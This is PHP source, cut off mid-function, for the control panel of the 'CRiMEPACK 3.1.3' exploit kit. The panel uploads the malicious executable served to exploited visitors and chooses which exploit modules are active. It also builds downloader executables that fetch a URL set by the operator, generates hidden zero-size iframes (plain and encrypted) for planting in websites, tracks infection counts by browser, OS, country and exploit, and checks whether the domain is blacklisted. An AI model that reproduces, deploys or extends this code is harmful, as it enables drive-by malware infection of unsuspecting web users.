<?php 
ob_start();
session_start();
if( !include_once("config.inc.php") ) 
{
    exit( "Error: configuration file does not exist!" );
}

if( file_exists("install.php") ) 
{
    exit( "Error: Remove install.php" );
}

$sessionid = $_SERVER["REMOTE_ADDR"] . dirname(__FILE__) . "CP";
include("CP-ENC-7531.php");
$cpMySQL->ConnectMySQL();
$pid = "mawttaf";
if( !isset($_SESSION[$sessionid]) ) 
{
    if( isset($_POST["login"]) && isset($_POST["password"]) ) 
    {
        $rets = mysql_query("SELECT * FROM `" . $cpMySQL->DataDecrypt(MYSQLPREFIX) . "users` WHERE login = '" . $cpMySQL->antisqli((isset($_POST["login"]) ? $_POST["login"] : "")) . "'");
        $row = mysql_fetch_row($rets);
        $adm_password = $row[2];
        if( isset($_POST["password"]) && md5($_POST["password"]) == $adm_password ) 
        {
            $_SESSION["guest"] = ($row[0] == "2" ? true : false);
            $_SESSION[$sessionid] = true;
            header("Location: " . $_SERVER["PHP_SELF"] . "?new=1");
            exit();
        }

    }
    else
    {
        LoginPage();
    }

}

if( !isset($_SESSION[$sessionid]) ) 
{
    LoginPage();
}

if( isset($_GET["page"]) ) 
{
    $p = $_GET["page"];
    switch( $p ) 
    {
        case "logout":
            session_destroy();
            header("Location: " . $_SERVER["PHP_SELF"] . "");
            exit();
        case "clear":
            if( !$_SESSION["guest"] ) 
            {
                ClearStats();
            }

            exit();
        case "confirmed":
            if( !$_SESSION["guest"] ) 
            {
                $cpMySQL->ClearDB();
                header("Location: " . $_SERVER["PHP_SELF"] . "");
            }

            exit();
        case "main":
            ShowStats("all");
            break;
        case "advstats":
            ShowStats("advstats");
            break;
        case "countries":
            ShowStats("countries");
            break;
        case "referrers":
            ShowStats("referrers");
            break;
        case "checkurl":
            CheckURL();
            break;
        case "makedownloader":
            Downloader();
            break;
        case "makeiframe":
            MakeIFrame();
            break;
        case "settings":
            if( !$_SESSION["guest"] ) 
            {
                ShowSettings();
            }

            break;
        default:
            ShowStats("all");
            break;
    }
}
else
{
    ShowStats("all");
}

function LoginPage()
{
    if( isset($_SERVER["PHP_AUTH_USER"]) ) 
    {
        if( $_SERVER["PHP_AUTH_USER"] == "crimepack" ) 
        {
            echo "\r\n\t\t\t  <html><head><link rel=\"stylesheet\" href=\"img/style.css\"></head><body>\r\n\r\n\t\t\t  <head>\r\n\t\t\t  <style>\r\n\t\t\t  body\r\n\t\t\t  {\r\n\t\t\t  background-image:url('./img/bg.jpg');\r\n\t\t\t  background-repeat:repeat;\r\n\t\t\t  }\r\n\t\t\t  </style>\r\n\t\t\t  <meta name=\"robots\" content=\"nofollow\" />\r\n\t\t\t  <body style=\"overflow: hidden;\" bgcolor=\"black\">\r\n\t\t\t  <br /><div style=\"position: absolute; width: 100%; height: 100%;\">\r\n\t\t\t  <center>\r\n\t\t\t  <img src=\"img/login.jpg\">\r\n\t\t\t  </center>\r\n\r\n\t\t\t  </div>\r\n\t\t\t  <div style=\"position: absolute; width: 100%; height: 100%;\"><center>\r\n\t\t\t  <form action=\"" . $_SERVER["PHP_SELF"] . "?page=main\" method=\"post\">\r\n\t\t\t  <div style=\"position: relative; top: 276px; left: -8px;\">\r\n\t\t\t  <input name=\"login\" style=\"border: 0px solid silver; background-color: transparent; color: gray; width: 114px;\" type=\"text\">\r\n\t\t\t  </div>\r\n\t\t\t  <div style=\"position: relative; top: 302px; left: -8px;\">\r\n\t\t\t  <input name=\"password\" type=\"password\" style=\"border: 0px solid silver; background-color: transparent; color: gray; width: 114px;\" type=\"text\">\r\n\t\t\t  </div>\r\n\r\n\t\t\t  <div style=\"position: relative; top: 306px; left: 190px;\">\r\n\t\t\t  <input value=\"\" name=\"submit\" style=\"border: 0px solid gray; background-color: transparent; height: 40px; width: 40px; color: gray;\" type=\"submit\"></div>\r\n\t\t\t  </form>\r\n\t\t\t  </center>\r\n\t\t\t  </div>\r\n\t\t\t  </body>\r\n\t\t\t  </html>\r\n\t\t\t  ";
            exit();
        }

        header("HTTP/1.0 401 Unauthorized");
        echo "Unauthorized";
        exit();
    }

    header("WWW-Authenticate: Basic realm=\"User/Pass\"");
    header("HTTP/1.0 401 Unauthorized");
    echo "Unauthorized";
    exit();
}

function GetRate($load, $total)
{
    $_obfuscated_0D012A3E170608254006133E0B0A2D261A362F37371711_ = 0;
    if( $total != 0 && $load != 0 ) 
    {
        $_obfuscated_0D012A3E170608254006133E0B0A2D261A362F37371711_ = round(substr($load / $total * 100, 0, 5));
    }

    return $_obfuscated_0D012A3E170608254006133E0B0A2D261A362F37371711_;
}

function ShowSettings()
{
    global $cpMySQL;
    ShowHeader();
    $_obfuscated_0D0A5C082D242B160D3D173F1D2608331E262B1A115B11_ = array( "", "" );
    if( isset($_POST["save"]) ) 
    {
        $_obfuscated_0D0A5C082D242B160D3D173F1D2608331E262B1A115B11_[0] = "<br />Failed to upload file!";
        if( is_uploaded_file($_FILES["file"]["tmp_name"]) ) 
        {
            move_uploaded_file($_FILES["file"]["tmp_name"], $cpMySQL->DataDecrypt(LOADEXE));
            $_obfuscated_0D0A5C082D242B160D3D173F1D2608331E262B1A115B11_[0] = "<br />File uploaded!";
        }

    }
    else
    {
        if( isset($_POST["saveall"]) ) 
        {
            updateDefined("BADTRAFF", BADTRAFF, (isset($_POST["badtraff"]) ? $cpMySQL->DataEncrypt("1") : $cpMySQL->DataEncrypt("0")));
            updateDefined("AUTOCHECK", AUTOCHECK, (isset($_POST["autocheck"]) ? $cpMySQL->DataEncrypt("1") : $cpMySQL->DataEncrypt("0")));
            updateDefined("REDIRECT", REDIRECT, (isset($_POST["redirector"]) ? $cpMySQL->DataEncrypt("1") : $cpMySQL->DataEncrypt("0")));
            if( isset($_POST["mydomain"]) ) 
            {
                updateDefined("DOMAIN", DOMAIN, $cpMySQL->DataEncrypt($_POST["mydomain"]));
            }

            if( isset($_POST["redirdomain"]) ) 
            {
                updateDefined("REDIRURL", REDIRURL, $cpMySQL->DataEncrypt($_POST["redirdomain"]));
            }

            updateDefined("EXPLOITS", EXPLOITS, $cpMySQL->DataEncrypt(serialize((isset($_POST["exploitArray"]) ? $_POST["exploitArray"] : array(  )))));
            header("Location: " . basename($_SERVER["PHP_SELF"]) . "?page=settings&save=ok");
            exit();
        }

        if( isset($_POST["adminpass"]) ) 
        {
            if( $_POST["admlogin"] != NULL && $_POST["admpass"] != NULL ) 
            {
                $sql = "UPDATE `" . $cpMySQL->DataDecrypt(MYSQLPREFIX) . "users` SET login = '" . $cpMySQL->antisqli($_POST["admlogin"]) . "', password = '" . md5($cpMySQL->antisqli($_POST["admpass"])) . "' WHERE id = '1'";
                if( mysql_query($sql) ) 
                {
                    echo "Admin info updated!";
                }

            }

        }
        else
        {
            if( isset($_POST["guestpass"]) && $_POST["guestpasswd"] != NULL && $_POST["guestlogin"] != NULL ) 
            {
                $sql = "UPDATE `" . $cpMySQL->DataDecrypt(MYSQLPREFIX) . "users` SET login = '" . $cpMySQL->antisqli($_POST["guestlogin"]) . "', password = '" . md5($cpMySQL->antisqli($_POST["guestpasswd"])) . "' WHERE id = '2'";
                if( mysql_query($sql) ) 
                {
                    echo "Guest info updated!";
                }

            }

        }

    }

    $rets = mysql_query("SELECT * FROM `" . $cpMySQL->DataDecrypt(MYSQLPREFIX) . "users` WHERE `id` = '1'");
    $row = mysql_fetch_row($rets);
    $_obfuscated_0D0E5C132C2802264037142D0E332930253E0908363301_ = $row[1];
    $rets = mysql_query("SELECT * FROM `" . $cpMySQL->DataDecrypt(MYSQLPREFIX) . "users` WHERE `id` = '2'");
    $row = mysql_fetch_row($rets);
    $_obfuscated_0D1E01401E090102322B34282F301B35331C152E0A0F01_ = $row[1];
    echo "\r\n      <table class=\"tbl2\" width=\"800\"><tr>\r\n      <td class=\"tdtoptable\" width=\"800\" align=\"center\"><b>settings</b></td></tr></table>\r\n      <table class=\"tbl1\" width=\"800\"><tr>\r\n      \r\n      <form method=\"post\" enctype=\"multipart/form-data\">\r\n      <td align=\"center\" class=\"td1\" width=\"800\"><b>admin account</b></td></tr>\r\n      <td align=\"center\" class=\"tdx1\" width=\"800\">\r\n      Login: <input type=\"text\" name=\"admlogin\" value=\"" . $_obfuscated_0D0E5C132C2802264037142D0E332930253E0908363301_ . "\" >\r\n      Password: <input type=\"text\" name=\"admpass\" value=\"\" >\r\n      <input type=\"submit\" name=\"adminpass\" value=\"Update\">\r\n      </td>\r\n      </form>\r\n      \r\n      <form method=\"post\" enctype=\"multipart/form-data\">\r\n      <tr><td align=\"center\" class=\"td1\" width=\"800\"><b>guest account</b></td></tr>\r\n      <td align=\"center\" class=\"tdx1\" width=\"800\">\r\n      Login: <input type=\"text\" name=\"guestlogin\" value=\"" . $_obfuscated_0D1E01401E090102322B34282F301B35331C152E0A0F01_ . "\" >\r\n      Password: <input type=\"text\" name=\"guestpasswd\" value=\"\" >\r\n      <input type=\"submit\" name=\"guestpass\" value=\"Update\"><br />\r\n      </td>\r\n      </form>\r\n            \r\n      <tr><td align=\"center\" class=\"td1\" width=\"800\"><b>loader file</b></td>\r\n      </tr>\r\n      <td align=\"center\" class=\"tdx1\" width=\"800\">\r\n      <form method=\"post\" enctype=\"multipart/form-data\">\r\n      <input type=\"file\" name=\"file\"\">&nbsp;&nbsp;\r\n      <input type=\"submit\" name=\"save\" value=\"Upload\">\r\n      " . $_obfuscated_0D0A5C082D242B160D3D173F1D2608331E262B1A115B11_[0] . "\r\n      </form>\r\n      </td>\r\n      <tr>\r\n      <td align=\"center\" class=\"tdx2\" width=\"800\">\r\n      ";
    if( file_exists($cpMySQL->DataDecrypt(LOADEXE)) ) 
    {
        $_obfuscated_0D042B0D0D1A09265C1D0C3B2E12041A302E3C030B0D32_ = fopen($cpMySQL->DataDecrypt(LOADEXE), "rb");
        $_obfuscated_0D2601080F1940042917183C39303B3C39141808351101_ = fread($_obfuscated_0D042B0D0D1A09265C1D0C3B2E12041A302E3C030B0D32_, 2);
        fclose($_obfuscated_0D042B0D0D1A09265C1D0C3B2E12041A302E3C030B0D32_);
        if( $_obfuscated_0D2601080F1940042917183C39303B3C39141808351101_ != "MZ" ) 
        {
            echo "<font color=red><b>WARNING:</b> Uploaded file is NOT a PE file - This WILL affect your loads.</font>";
        }
        else
        {
            echo "current file: " . filesize($cpMySQL->DataDecrypt(LOADEXE)) / 1024 . "kb (" . filesize($cpMySQL->DataDecrypt(LOADEXE)) . " bytes) md5: " . md5_file($cpMySQL->DataDecrypt(LOADEXE)) . "";
        }

    }
    else
    {
        echo "<font color=red><b>WARNING: You have no load file uploaded. You _SHOULD_ upload one now!</B></font>";
    }

    echo "</td></tr>\r\n      <tr><td align=\"center\" class=\"td1\" width=\"800\"><b>various settings</b></td>\r\n      </tr>\r\n      <td align=\"center\" class=\"tdx1\" width=\"800\">\r\n      <form method=\"post\" enctype=\"multipart/form-data\">\r\n      <table width=\"100%\">\r\n      <tr><td>\r\n      <input type=\"checkbox\" name=\"redirector\" \"" . (($cpMySQL->DataDecrypt(REDIRECT) == 1 ? "\"checked=checked\"" : "")) . "\"> redirect non-vulnerable traffic to <input type=\"text\" name=\"redirdomain\" value=\"" . $cpMySQL->DataDecrypt(REDIRURL) . "\"><br />\r\n      </td></tr>\r\n\t  <tr><td>\r\n      <input type=\"checkbox\" name=\"badtraff\" \"" . (($cpMySQL->DataDecrypt(BADTRAFF) == 1 ? "\"checked=checked\"" : "")) . "\"> allow bad traffic (not recommended)\r\n      </td></tr><tr><td>\r\n      <input type=\"checkbox\" name=\"autocheck\" \"" . (($cpMySQL->DataDecrypt(AUTOCHECK) == 1 ? "\"checked=checked\"" : "")) . "\"> check if domain is blacklisted on login<br /><center>\r\n      domain name<br /><input type=\"text\" name=\"mydomain\" value=\"" . $cpMySQL->DataDecrypt(DOMAIN) . "\"></center>\r\n      </td></tr></table>";
    echo "<tr><td class=\"td1\" align=\"center\" width=\"800\"><b>exploits</b></td></tr>\r\n      \r\n      <tr><td class=\"tdx1\" align=\"center\" width=\"800\">\r\n      <form method=\"post\" enctype=\"multipart/form-data\">\r\n      <table width=\"100%\">\r\n      <tbody>";
    $_obfuscated_0D1629163136072A1E2B3B22050B1B0B3234262E1E3F32_ = "";
    $_obfuscated_0D1C1D063F1C3E225B2E042C050622370A0D0329120101_ = unserialize($cpMySQL->DataDecrypt(EXPLOITS));
    $dir = array(  );
    $_obfuscated_0D1F290D241B140601062F2D19053B05211B2C172C1E32_ = array(  );
    $_obfuscated_0D1E075B2921390A3D401B37033B142808272B1F5B3601_ = "./exploits";
    if( !isset($dir[$_obfuscated_0D1E075B2921390A3D401B37033B142808272B1F5B3601_]) ) 
    {
        $dir[$_obfuscated_0D1E075B2921390A3D401B37033B142808272B1F5B3601_] = scandir($_obfuscated_0D1E075B2921390A3D401B37033B142808272B1F5B3601_);
    }

    foreach( $dir[$_obfuscated_0D1E075B2921390A3D401B37033B142808272B1F5B3601_] as $i => $_obfuscated_0D1737393D3508105C11360619293803381E5C01403011_ ) 
    {
        if( $_obfuscated_0D1737393D3508105C11360619293803381E5C01403011_ != "." && $_obfuscated_0D1737393D3508105C11360619293803381E5C01403011_ != ".." && fnmatch("*.php", $_obfuscated_0D1737393D3508105C11360619293803381E5C01403011_) && file_exists($_obfuscated_0D1E075B2921390A3D401B37033B142808272B1F5B3601_ . "/" . str_replace(".php", ".ini", $_obfuscated_0D1737393D3508105C11360619293803381E5C01403011_)) ) 
        {
            array_push($_obfuscated_0D1F290D241B140601062F2D19053B05211B2C172C1E32_, $_obfuscated_0D1737393D3508105C11360619293803381E5C01403011_);
        }

    }
    for( $i = 0; $i < count($_obfuscated_0D1F290D241B140601062F2D19053B05211B2C172C1E32_); $i++ ) 
    {
        if( $_obfuscated_0D1F290D241B140601062F2D19053B05211B2C172C1E32_[$i] != "." && $_obfuscated_0D1F290D241B140601062F2D19053B05211B2C172C1E32_[$i] != ".." ) 
        {
            list($_obfuscated_0D0A2A3D2D17021B1D2A2D2322392E0C0109050F0D3522_) = explode(".", $_obfuscated_0D1F290D241B140601062F2D19053B05211B2C172C1E32_[$i]);
            $_obfuscated_0D3C1E33141C3F2F2F3F370F1108041C262314152F1B11_ = parse_ini_file("./exploits/" . $_obfuscated_0D0A2A3D2D17021B1D2A2D2322392E0C0109050F0D3522_ . ".ini");
            if( $i % 2 == 0 ) 
            {
                $_obfuscated_0D1629163136072A1E2B3B22050B1B0B3234262E1E3F32_ .= "</tr><tr>";
            }

            $_obfuscated_0D1629163136072A1E2B3B22050B1B0B3234262E1E3F32_ .= "\n<tr><td><input type='checkbox' id='" . $_obfuscated_0D3C1E33141C3F2F2F3F370F1108041C262314152F1B11_["name"] . "' name='exploitArray[]' value='" . $_obfuscated_0D0A2A3D2D17021B1D2A2D2322392E0C0109050F0D3522_ . "'" . ((@in_array($_obfuscated_0D0A2A3D2D17021B1D2A2D2322392E0C0109050F0D3522_, $_obfuscated_0D1C1D063F1C3E225B2E042C050622370A0D0329120101_) ? " checked" : "")) . "><label for='" . $_obfuscated_0D3C1E33141C3F2F2F3F370F1108041C262314152F1B11_["name"] . "'>" . $_obfuscated_0D3C1E33141C3F2F2F3F370F1108041C262314152F1B11_["desc"] . "</label></tr></td>\n";
        }

    }
    echo $_obfuscated_0D1629163136072A1E2B3B22050B1B0B3234262E1E3F32_ . "\r\n      </table>\r\n      <br /><br />\r\n      <input name=\"saveall\" value=\"Save settings\" type=\"submit\">\r\n      " . ((isset($_GET["save"]) ? "<br /><br />settings saved!" : "")) . "\r\n      </form><br /><br />\r\n      </td></tr></tbody>\r\n      <br />";
}

function ClearStats()
{
    global $cpMySQL;
    ShowHeader();
    echo "\r\n      \r\n      <center><form method=\"post\" action=\"" . $_SERVER["PHP_SELF"] . "?page=confirmed\">\r\n      <table class=\"tbl2\" width=\"800\"><tr>\r\n      Please confirm<br /><br /><input type='submit' value='&nbsp;Clear stats'><br /><br />\r\n      </form>";
}

function MakeIFrame()
{
    global $cpMySQL;
    global $cpFunctions;
    $dirname = dirname($_SERVER["PHP_SELF"]);
    $_obfuscated_0D260C03033D190F145C0A270440232F081E06215B2D32_ = $_SERVER["HTTP_HOST"];
    $_obfuscated_0D1E075B2921390A3D401B37033B142808272B1F5B3601_ = "http://" . $_obfuscated_0D260C03033D190F145C0A270440232F081E06215B2D32_ . ((strlen($dirname) <= 1 ? "" : str_replace("\\", "/", $dirname))) . "/";
    $url = $_obfuscated_0D1E075B2921390A3D401B37033B142808272B1F5B3601_ . "index.php";
    ShowHeader();
    $_obfuscated_0D342B3E012F243E2C195B1206252B150806151D240201_ = "<iframe name=\"" . $cpFunctions->RandLtr(10, 2) . "\" src=\"" . $url . "\" marginwidth=\"1\" marginheight=\"0\" title=\"" . $cpFunctions->RandLtr(10, 2) . "\" border=\"0\" width=\"1\" frameborder=\"0\" height=\"0\" scrolling=\"no\"></iframe>";
    echo "\r\n         <center><b>no crypt</b><br />\r\n         <textarea rows=\"2\" style=\"width:92%;\">" . $_obfuscated_0D342B3E012F243E2C195B1206252B150806151D240201_ . "</textarea><br />\r\n         <b>crypted</b><br />\r\n         <textarea rows=\"10\" style=\"width:92%;overflow-y: scroll;\"\">" . CPackExploitHelper::iframecrypt(substr($url, 7)) . "</textarea></center><br />";
}

function CheckURL()
{
    global $cpMySQL;
    ShowHeader();
    echo "<script type=\"text/javascript\" src=\"ajax.js\"></script>\r\n      <center>\r\n      <script type=\"text/javascript\" defer>\r\n      function auth () {\r\n      if(document.getElementById('url').value){\r\n            url = document.getElementById('url').value;\r\n            ajax_load('CP-ENC-5364.php?URL='+url, 'malwarecheck','img/loading.gif','Checking....');\r\n         }\r\n      }\r\n      </script>\r\n      <form onsubmit='auth(); return false;'>\r\n      <table class=\"tbl2\" width=\"800\"><tr>\r\n      <td class=\"tdtoptable\" width=\"800\" align=\"center\"><b>blacklist checker</b></td></tr></table>\r\n      URL To Check<br /><br /><input type='text' id='url' name='url' value='" . $cpMySQL->DataDecrypt(DOMAIN) . "'><br /><br /><input type='submit' value='Check'><br /><br />\r\n      <div id='malwarecheck'>\r\n      </div>\r\n      </form>";
}

function Downloader()
{
    ShowHeader();
    $_obfuscated_0D0A5C082D242B160D3D173F1D2608331E262B1A115B11_ = "";
    if( isset($_POST["url"]) ) 
    {
        $url = $_POST["url"];
        if( 150 < strlen($url) ) 
        {
            $_obfuscated_0D0A5C082D242B160D3D173F1D2608331E262B1A115B11_ = "<br />URL is too long! (Max 150 chars)";
        }
        else
        {
            if( strlen($url) < 10 ) 
            {
                $_obfuscated_0D0A5C082D242B160D3D173F1D2608331E262B1A115B11_ = "<br />URL too short/invalid";
            }
            else
            {
                $fh = fopen("./dlstub", "r");
                $data = fread($fh, filesize("./dlstub"));
                fclose($fh);
                $data = str_replace("@" . str_repeat("_", strlen($url)), $url . "!", $data);
                $n = rand(10000, 99999);
                $x = 151;
                $y = strlen($url) + 1;
                $x = $x - $y;
                $data = str_replace(str_repeat("_", $x), str_repeat(pack("H*", "00"), $x), $data);
                $_obfuscated_0D042B0D0D1A09265C1D0C3B2E12041A302E3C030B0D32_ = fopen("./tmp/cpack_dloader_" . $n . ".exe", "w");
                fputs($_obfuscated_0D042B0D0D1A09265C1D0C3B2E12041A302E3C030B0D32_, $data);
                fclose($_obfuscated_0D042B0D0D1A09265C1D0C3B2E12041A302E3C030B0D32_);
                $_obfuscated_0D0A5C082D242B160D3D173F1D2608331E262B1A115B11_ = "<br /><a href=\"./tmp/cpack_dloader_" . $n . ".exe\">click here to download</a><br />";
            }

        }

    }

    echo "<center><form method=\"post\" enctype=\"multipart/form-data\"><table class=\"tbl2\" width=\"800\">\r\n      <tr><td class=\"tdtoptable\" width=\"800\" align=\"center\"><b>Downloader builder</b></td></tr></table>\r\n      URL to file <br /><br /><input type='text' id='url' name='url' value='' style='width:400px;'><br /><br /><input type='submit' value='Create'><br />" . $_obfuscated_0D0A5C082D242B160D3D173F1D2608331E262B1A115B11_ . "<br /></form>";
}

function ShowHeader()
{
    echo "\r\n\t   <html><head><title>CRiMEPACK 3.1.3</title><link rel=\"stylesheet\" href=\"img/style.css\"></head><body>\r\n      <table class=\"main\" align=\"center\">\r\n      <tr>\r\n      <td width=\"800\" valign=\"top\">\r\n      <center><img src=img/logo.png><br /><br />\r\n      <table class=\"tbl2\" width=\"100%\" height=\"20\"><tr>\r\n      <td class=\"menutable\" width=\"100%\" height=\"20\" align=\"center\">\r\n      <b><a href=" . $_SERVER["PHP_SELF"] . "?page=main>MAiN</a>\r\n      <img src=./img/dot.png> <a href=javascript:window.location.reload(false);>REFRESH</a>\r\n      <img src=./img/dot.png> <a href=?page=referrers>REFERRERS</a>\r\n      <img src=./img/dot.png> <a href=?page=countries>COUNTRiES</a>\r\n      <img src=./img/dot.png> <a href=?page=checkurl>BLACKLiST CHECK</a>\r\n      <img src=./img/dot.png> <a href=?page=makedownloader>DOWNLOADER</a>\r\n      <img src=./img/dot.png> <a href=?page=makeiframe>iFRAME</a>";
    if( !$_SESSION["guest"] ) 
    {
        echo "<img src=./img/dot.png> <a href=?page=clear>CLEAR STATS</a> <img src=./img/dot.png> <a href=?page=settings>SETTiNGS</a>";
    }
    else
    {
        echo "<img src=./img/dot.png> <a href=javascript:alert('access%20denied');>CLEAR STATS</a> <img src=./img/dot.png> <a href=javascript:alert('access%20denied');>SETTINGS</a>";
    }

    echo " <img src=./img/dot.png> <a href=?page=logout>LOGOUT</a></b>\r\n      </td></tr></table>\r\n      <br />\r\n      </center>\r\n      ";
}

function ShowStats($stats)
{
    global $pid;
    global $cpMySQL;
    $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_ = array( "segadora1" => array(  ), "crimepack" => array(  ), "browsers" => array(  ), "os" => array(  ), "referrers" => array(  ), "countries" => array(  ), "extra" => array(  ) );
    $sql = "SELECT * FROM `" . $cpMySQL->DataDecrypt(MYSQLPREFIX) . "peeps`";
    $result = mysql_query($sql);
    while( $_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_ = mysql_fetch_array($result) ) 
    {
        if( empty($_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["country"]) ) 
        {
            $_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["country"] = "Unknown";
        }

        if( !empty($_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["sploit"]) ) 
        {
            if( isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads"]) ) 
            {
                $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads"]++;
            }
            else
            {
                $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads"] = 1;
            }

            if( isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_" . $_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["browser"]]) ) 
            {
                $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_" . $_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["browser"]]++;
            }
            else
            {
                $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_" . $_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["browser"]] = 1;
            }

            if( isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_" . $_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["os"]]) ) 
            {
                $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_" . $_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["os"]]++;
            }
            else
            {
                $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_" . $_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["os"]] = 1;
            }

            if( !empty($_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["sploit"]) ) 
            {
                if( isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["load_" . $_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["sploit"]]) ) 
                {
                    $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["load_" . $_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["sploit"]]++;
                }
                else
                {
                    $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["load_" . $_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["sploit"]] = 1;
                }

            }

            if( !empty($_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["extra"]) ) 
            {
                if( isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["extra"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["extra"]]) ) 
                {
                    $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["extra"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["extra"]]++;
                }
                else
                {
                    $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["extra"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["extra"]] = 1;
                }

            }

            if( !isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["countries"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["country"]]["loads"]) ) 
            {
                $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["countries"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["country"]]["loads"] = 1;
            }
            else
            {
                $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["countries"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["country"]]["loads"]++;
            }

            if( !isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["referrers"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["referer"]]["loads"]) && 1 < strlen($_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["referer"]) ) 
            {
                $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["referrers"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["referer"]]["loads"] = 1;
            }
            else
            {
                if( 1 < strlen($_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["referer"]) ) 
                {
                    $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["referrers"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["referer"]]["loads"]++;
                }

            }

        }

        if( isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["browser"]]) ) 
        {
            $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["browser"]]++;
        }
        else
        {
            $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["browser"]] = 1;
        }

        if( isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["os"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["os"]]) ) 
        {
            $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["os"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["os"]]++;
        }
        else
        {
            $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["os"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["os"]] = 1;
        }

        if( isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["hits"]) ) 
        {
            $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["hits"]++;
        }
        else
        {
            $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["hits"] = 1;
        }

        if( !isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["countries"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["country"]]["hits"]) ) 
        {
            $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["segadora1"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["country"]] = 1;
            $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["countries"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["country"]]["hits"] = 1;
        }
        else
        {
            $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["segadora1"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["country"]]++;
            $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["countries"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["country"]]["hits"]++;
        }

        if( !isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["referrers"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["referer"]]["hits"]) && 1 < strlen($_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["referer"]) ) 
        {
            $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["referrers"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["referer"]]["hits"] = 1;
        }
        else
        {
